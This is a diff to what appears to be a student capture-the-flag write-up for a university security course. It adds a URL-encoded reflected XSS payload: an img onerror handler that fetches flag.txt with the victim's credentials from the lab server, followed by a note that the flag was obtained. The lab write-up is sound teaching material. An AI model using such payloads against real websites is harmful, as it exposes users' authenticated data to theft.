@@ -24,7 +24,12 @@ This way, we can see that this website is vulnerable, and we can use this exploi
 
 ![Image 3](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/CTF7_img3.png)
 
+After getting the fetch, we encoded the previous url of the attack with the fetch:
+```https://ctf-fsi.fe.up.pt:5007/?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3D%22fetch%28%27https%3A%2F%2Fctf-fsi.fe.up.pt%3A5007%2Fflag.txt%27%2C%7Bcache%3A%27default%27%2Ccredentials%3A%27include%27%2Cmethod%3A%27GET%27%2Cmode%3A%27cors%27%2Credirect%3A%27follow%27%2Creferrer%3A%27https%3A%2F%2Fctf-fsi.fe.up.pt%3A5007%2F%27%2CreferrerPolicy%3A%27strict-origin-when-cross-origin%27%7D%29.then%28response%3D%3Eresponse.text%28%29%29.then%28data%3D%3Econsole.log%28data%29%29.catch%28err%3D%3Econsole.error%28err%29%29%22%3E```
 
+We obtained the flag successfuly!! 
+
+![Image 4](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/CTF7_img4.png)
 
 ##### What type of XSS vulnerability (Reflected, Stored, or DOM) allowed you to access the flag?
 
